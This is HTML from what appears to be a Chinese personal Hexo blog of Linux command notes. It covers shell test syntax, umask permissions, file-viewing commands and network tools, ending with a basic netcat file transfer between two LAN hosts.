+<p>1.你必须在左括号的右侧和右括号的左侧各加一个空格，否则会报错<br>2.test命令使用标准的数学比较符号来表示字符串的比较，而用文本符号来表示数值的比较。很多人会记反了。使用反了，shell可能得不到正确的结果。<br>3.大于符号或小于符号必须要转义，否则会被理解成重定向。</p>
+<ul>
+<li><code>(( ))及[[ ]]</code>:<br>它们分别是[ ]的针对数学比较表达式和字符串表达式的加强版<ul>
+<li>在<code>[[ ]]</code>中增加了另一个特性：模式匹配</li>
+<li>其中<code>(( ))</code>，不需要再将表达式里面的大小于符号转义，除了可以使用标准的数学运算符外，还增加了以下符号：</li>
+</ul>
+</li>
+</ul>
+<p><a href="http://blog.csdn.net/x1269778817/article/details/46535729" target="_blank" rel="noopener">Linux shell 中<code>$()</code> <code>，${}，$[] $(())，[ ] (( )) [[ ]]</code>作用与区别</a></p>
+<h2 id="获取本机IP地址"><a href="#获取本机IP地址" class="headerlink" title="获取本机IP地址"></a>获取本机IP地址</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipaddr=`/sbin/ifconfig | grep 'inet addr:' | grep -v '127.0.0.1'|cut -d : -f2 | awk '&#123;print $1&#125;'`</span><br><span class="line">echo $ipaddr</span><br></pre></td></tr></table></figure>
+
+<h2 id="umark-022"><a href="#umark-022" class="headerlink" title="umark 022"></a>umark 022</h2><p>预设权限<br>目录的预设权限是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0777 drwxrwxrwx</span><br></pre></td></tr></table></figure>
+
+<p>文件的预设权限是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0666 -rw-rw-rw-</span><br></pre></td></tr></table></figure>
+
+<p>其中r的十进制值是4，w的十进制值是2，x的十进制值是1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">umask=022中&quot;022&quot;是八进制的写法，如果换成二进制是000010010</span><br><span class="line">在unix中文件权限是三类用户，三种权限。三类用户分别是文件所有者user(u)，文件所有者所在主群组group(g)、其它用户others(o)，三种权限分别是起读read(r)、写write(w)、执行execute(x)。</span><br><span class="line">如果一个文件的权限如下：所有者有读写的权限，群组有读和执行权限、其它用户有读权限，可以写成：</span><br><span class="line">rw-r-xr--</span><br><span class="line">其中前三位指明了所有者的权限、中间三位指明了组权限、最后三位指明了其它用户的权限。我们用ls -l可以看到文件权限详情，列出来的是10位，最前一位如果是d表示是子目录。</span><br><span class="line">说回来，如果把这上面9位字母换成二进制数则是：</span><br><span class="line">110101100</span><br><span class="line">如果换成八进制是多少？</span><br><span class="line">因此文件权限可以用9位二进制数表示。umask在英文中是屏蔽的意思，那么</span><br><span class="line">umask=022</span><br><span class="line">指屏蔽文件的022权限，到底屏蔽了什么？将这个八进制数用二进制表示</span><br><span class="line">000010010</span><br><span class="line">换算成字母是</span><br><span class="line">----w--w-</span><br><span class="line">#指取消组的写权限、取消其它用户的写权限。</span><br><span class="line">屏蔽这些权限后，剩下什么权限呢？用字母表示是：</span><br><span class="line">#rwxr-xr-x</span><br><span class="line">用二进制数表示是：</span><br><span class="line">111101101</span><br><span class="line">你可以对比一下</span><br><span class="line">000010010</span><br><span class="line">可以知道屏蔽前后的换算关系。</span><br></pre></td></tr></table></figure>
+
+<p>umask决定目录和文件被创建时得到的初始权限<br>umask = 022时<br>新建的目录 权限是755<br>文件的权限是 644</p>
+<h2 id="readonly-WSREP-SST-OPT-BYPASS"><a href="#readonly-WSREP-SST-OPT-BYPASS" class="headerlink" title="readonly WSREP_SST_OPT_BYPASS"></a>readonly WSREP_SST_OPT_BYPASS</h2><p>readonly命令用于定义只读shell变量和shell函数。readonly命令的选项-p可以输出显示系统中所有定义的只读变量。<br><a href="http://man.linuxde.net/readonly" target="_blank" rel="noopener">http://man.linuxde.net/readonly</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/28/Linux/Linux文件操作命令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/28/Linux/Linux文件操作命令/" itemprop="url">Linux文件操作命令</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-28T21:38:07+08:00">
+                2019-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>功能类似 cat ，cat命令是整个文件的内容从上到下显示在屏幕上。 more会以一页一页的显示方便使用者逐页阅读,more命令从前向后读取文件，因此<code>在启动时就加载整个文件</code>.</p>
+<p>参数命令<br>-n 定义屏幕大小为n行,不指定会覆盖整个屏幕<br>常用操作命令：<br>按 b 键就会往回（back）一页显示<br>空格键 向下滚动一屏<br>= 输出当前行的行号<br>：f 输出文件名和当前行的行号<br>!命令 调用Shell，并执行命令<br>q 退出more<br>例子：<br>ls -l |more -2<br>more命令</p>
+<h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>-c 抑制正常输出; 而是为每个输入文件打印一个匹配行数,用-v部分计算不匹配的行<br>-v排除某一行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]<span class="comment"># grep -c for httpserver.py</span></span><br><span class="line">4</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/28/Linux/技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/28/Linux/技巧/" itemprop="url">未命名</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-28T09:07:36+08:00">
+                2019-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/28/Linux/Linux网络命令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/28/Linux/Linux网络命令/" itemprop="url">Linux网络命令</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-28T08:37:37+08:00">
+                2019-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux命令/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux命令</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><h2 id="ethtool"><a href="#ethtool" class="headerlink" title="ethtool"></a>ethtool</h2><p>ethtool 是用于查询及设置网卡参数的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ethtool em3</span><br><span class="line">Settings for em3:</span><br><span class="line"> Supported ports: [ TP ]</span><br><span class="line"> Supported link modes: 10baseT/Half 10baseT/Full</span><br><span class="line">                         100baseT/Half 100baseT/Full</span><br><span class="line">                         1000baseT/Full</span><br><span class="line"> Supported pause frame use: Symmetric</span><br><span class="line"> Supports auto-negotiation: Yes</span><br><span class="line"> Advertised link modes: 10baseT/Half 10baseT/Full</span><br><span class="line">                         100baseT/Half 100baseT/Full</span><br><span class="line">                         1000baseT/Full</span><br><span class="line"> Advertised pause frame use: Symmetric</span><br><span class="line"> Advertised auto-negotiation: Yes #自动协商关闭</span><br><span class="line"> Speed: 1000Mb/s</span><br><span class="line"> Duplex: Full #全双工</span><br><span class="line"> Port: Twisted Pair</span><br><span class="line"> PHYAD: 1</span><br><span class="line"> Transceiver: internal</span><br><span class="line"> Auto-negotiation: on</span><br><span class="line"> MDI-X: on (auto)</span><br><span class="line"> Supports Wake-on: d</span><br><span class="line"> Wake-on: d</span><br><span class="line"> Current message level: 0x00000007 (7)</span><br><span class="line">          drv probe link</span><br><span class="line"> Link detected: yes  # linux的网卡是否已经连接网线</span><br></pre></td></tr></table></figure>
+
+<h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">bond0 Link encap:Ethernet HWaddr 40:A8:F0:23:55:FC</span><br><span class="line">          inet addr:10.88.145.147 Bcast:10.88.147.255 Mask:255.255.252.0</span><br><span class="line">          UP BROADCAST RUNNING MASTER MULTICAST MTU:1500 Metric:1</span><br><span class="line">          RX packets:447831519898 errors:0 dropped:94610 overruns:0 frame:0</span><br><span class="line">          TX packets:384908972374 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:490100615940053 (445.7 TiB) TX bytes:396116630222981 (360.2 TiB)</span><br><span class="line">第一行：连接类型：Ethernet（以太网）HWaddr（硬件mac地址）</span><br><span class="line">第二行：网卡的IP地址、子网、掩码</span><br><span class="line">第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500字节</span><br><span class="line">第四、五行：接收、发送数据包情况统计</span><br><span class="line">第七行：接收、发送数据字节数统计信息。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">卸载网卡</span><br><span class="line">sudo ifconfig vmnet1 down</span><br><span class="line">启动网卡</span><br><span class="line">sudo ifconfig vmnet1 up</span><br></pre></td></tr></table></figure>
+
+<h2 id="ifconfig-ifup-ifdown"><a href="#ifconfig-ifup-ifdown" class="headerlink" title="ifconfig ifup ifdown"></a>ifconfig ifup ifdown</h2><p><a href="https://huangkaibo.cn/2018/04/21/ifconfig-ifup-ifdown/" target="_blank" rel="noopener">https://huangkaibo.cn/2018/04/21/ifconfig-ifup-ifdown/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifup eth0</span><br><span class="line">ifdown eth0</span><br></pre></td></tr></table></figure>
+
+<h2 id="dhclinet"><a href="#dhclinet" class="headerlink" title="dhclinet"></a>dhclinet</h2><p>dhclient命令使用动态主机配置协议动态的配置网络接口的网络参数</p>
+<h1 id="域名路由"><a href="#域名路由" class="headerlink" title="域名路由"></a>域名路由</h1><h2 id="route"><a href="#route" class="headerlink" title="route"></a>route</h2><p>route -n # 查看路由表</p>
+<h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>netstat -nr<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface<br>10.86.40.0      0.0.0.0         255.255.252.0   U         0 0          0 eth0<br>169.254.0.0     0.0.0.0         255.255.0.0     U         0 0          0 eth0<br>0.0.0.0         10.86.40.1      0.0.0.0         UG        0 0          0 eth0</p>
+<h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><blockquote>
+<p>dig（域信息搜索器）命令是一个用于询问 DNS 域名服务器的灵活的工具</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tldr dig</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DNS Lookup utility.</span><br><span class="line"></span><br><span class="line">- Lookup the IP(s) associated with a hostname (A records):</span><br><span class="line">    dig +short hostname.com</span><br><span class="line"></span><br><span class="line">- Lookup the mail server(s) associated with a given domain name (MX record):</span><br><span class="line">    dig +short hostname.com MX</span><br><span class="line"></span><br><span class="line">- Get all types of records for a given domain name:</span><br><span class="line">    dig hostname.com ANY</span><br><span class="line"></span><br><span class="line">- Specify an alternate DNS server to query:</span><br><span class="line">    dig @8.8.8.8 hostname.com</span><br><span class="line"></span><br><span class="line">- Perform a reverse DNS lookup on an IP address (PTR record):</span><br><span class="line">    dig -x 8.8.8.8</span><br><span class="line"></span><br><span class="line">- Find authoritative name servers for the zone and display SOA records:</span><br><span class="line">    dig +nssearch hostname.com</span><br><span class="line"></span><br><span class="line">- Perform iterative queries and display the entire trace path to resolve a domain name:</span><br><span class="line">    dig +trace hostname.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="控制输出"><a href="#控制输出" class="headerlink" title="控制输出"></a>控制输出</h3><p>输出内容太多,只显示结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig +nssearch baidu.com any |awk <span class="string">'&#123;print($11)&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig +noall +answer dubai.com any|awk <span class="string">'&#123;print($5)&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h1><h2 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h2><h3 id="查看开放端口"><a href="#查看开放端口" class="headerlink" title="查看开放端口"></a>查看开放端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@server ~]# ss -lt</span><br><span class="line">State      Recv-Q Send-Q                                             Local Address:Port                                                 Peer Address:Port</span><br><span class="line">LISTEN     0      128                                                            *:1001                                                            *:*</span><br><span class="line">LISTEN     0      50                                                             *:mysql                                                           *:*</span><br></pre></td></tr></table></figure>
+
+<p>ss<br>ss的含义 Socket State<br>查看链接<br><a href="https://blog.csdn.net/arkblue/article/details/7876210" target="_blank" rel="noopener">https://blog.csdn.net/arkblue/article/details/7876210</a></p>
+<h2 id="netstat-1"><a href="#netstat-1" class="headerlink" title="netstat"></a>netstat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ni</span><br><span class="line">i 提供网络接口的信息，</span><br><span class="line">n 输出数值地址，而不是试图把他们反向解析成名字</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">netstat -na|less</span><br><span class="line">Proto Recv-Q Send-Q Local Address</span><br><span class="line">tcp4 9 0 127.0.0.1.16000 127.0.0.1.49895 ESTABLISHED</span><br><span class="line">tcp4 3762 0 127.0.0.1.16000 127.0.0.1.49899 ESTABLISHED</span><br><span class="line">tcp4 215 0 127.0.0.1.16000 127.0.0.1.49894 ESTABLISHED</span><br><span class="line">tcp4 127 0 127.0.0.1.16000 127.0.0.1.49891 ESTABLISHED</span><br><span class="line">tcp4 334 0 127.0.0.1.16000 127.0.0.1.49907 ESTABLISHED</span><br></pre></td></tr></table></figure>
+
+<p>查看机器开放哪些端口:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp</span><br></pre></td></tr></table></figure>
+
+<p>查看进程对应开放端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp|grep pid</span><br></pre></td></tr></table></figure>
+
+<h2 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h2><p>查看端口使用情况<br><code>lsof -i tcp:port</code><br>查看进程详细信息<br><code>lsof -p pid</code></p>
+<h1 id="流量统计"><a href="#流量统计" class="headerlink" title="流量统计"></a>流量统计</h1><h2 id="iftop"><a href="#iftop" class="headerlink" title="iftop"></a>iftop</h2><h2 id="nsload"><a href="#nsload" class="headerlink" title="nsload"></a>nsload</h2><h1 id="网络抓包"><a href="#网络抓包" class="headerlink" title="网络抓包"></a>网络抓包</h1><h2 id="tshark"><a href="#tshark" class="headerlink" title="tshark"></a>tshark</h2><p>tshark不仅有抓包的功能，还带了解析各种协议的能力<br><a href="https://www.centos.bz/2014/07/linux-commandline-capture-packets-tshark-wireshark/" target="_blank" rel="noopener">https://www.centos.bz/2014/07/linux-commandline-capture-packets-tshark-wireshark/</a><br><a href="http://www.qingpingshan.com/pc/fwq/353123.html" target="_blank" rel="noopener">http://www.qingpingshan.com/pc/fwq/353123.html</a></p>
+<h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><h3 id="tcpdump复杂过滤规则"><a href="#tcpdump复杂过滤规则" class="headerlink" title="tcpdump复杂过滤规则"></a>tcpdump复杂过滤规则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -s 65535 -x -nn -q -tttt -i any -c __count__ host __host__ -w data.cap</span><br><span class="line">tcpdump -s 65535 -x -nn -q -tttt -i any -c __count__ port __port__ -w data.cap</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://www.nginx.cn/4692.html" target="_blank" rel="noopener">tcpdump抓取http的请求头和响应信息</a></p>
+<h2 id="ngrep"><a href="#ngrep" class="headerlink" title="ngrep"></a>ngrep</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ngrep -x -q -d lo &apos;&apos; &apos;port __port__&apos;</span><br><span class="line">sudo ngrep -x -q -d eth0 &apos;&apos; &apos;host __host__&apos;</span><br></pre></td></tr></table></figure>
+
+<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><h2 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h2><h2 id="sftp命令"><a href="#sftp命令" class="headerlink" title="sftp命令"></a>sftp命令</h2><p><a href="https://linux.cn/article-8253-1.html" target="_blank" rel="noopener">https://linux.cn/article-8253-1.html</a></p>
+<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>NetCat，在网络工具中有“瑞士军刀”美誉,一个简单、可靠的网络工具，可通过TCP或UDP协议传输读写数据,但是<code>不同版本支持参数会有差异</code>,当某些参数不能用时可以先确认下版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# type -a nc</span><br><span class="line">nc is /usr/bin/nc</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看安装nc的rpm包</span></span><br><span class="line">root@server1 ~]# rpm -q nc</span><br><span class="line">nc-1.84-22.el6.x86_64</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看安装路径</span></span><br><span class="line">[root@server1 ~]# rpm -ql nc</span><br><span class="line">/usr/bin/nc</span><br><span class="line">/usr/share/doc/nc-1.84</span><br><span class="line">/usr/share/doc/nc-1.84/README</span><br><span class="line">/usr/share/doc/nc-1.84/scripts</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/README</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/alta</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/bsh</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/dist.sh</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/irc</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/iscan</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/ncp</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/probe</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/web</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/webproxy</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/webrelay</span><br><span class="line">/usr/share/doc/nc-1.84/scripts/websearch</span><br><span class="line">/usr/share/man/man1/nc.1.gz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看帮助命令</span></span><br><span class="line">[root@server1 ~]# man nc</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看centos版本信息</span></span><br><span class="line">[root@server1 ~]# cat /etc/redhat-release</span><br><span class="line">CentOS release 6.4 (Final)</span><br></pre></td></tr></table></figure>
+
+<p>下面以Centos6.4,nc1.84.22版本进行演示,<code>A机器ip:192.168.10.1  B机器ip: 192.168.10.2</code></p>
+<h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><h4 id="主机A传输数据到主机B"><a href="#主机A传输数据到主机B" class="headerlink" title="主机A传输数据到主机B"></a>主机A传输数据到主机B</h4><p>nc 使用不同的箭头符号来控制到底是接收数据还是发送数据,下面是由主机A传输数据到主机B</p>
+<h5 id="正向传输"><a href="#正向传输" class="headerlink" title="正向传输"></a>正向传输</h5><p>参数解释:</p>
+<ul>
+<li>-l: 指定监听端口</li>
+</ul>
+<p>一般正常传输,主机A开启监听,主机B nc连接获取数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机A: nc -l 1234 &lt; xxx.txt</span><br><span class="line">主机B: nc 192.168.10.1 1234 &gt; xxx.txt</span><br></pre></td></tr></table></figure>
+
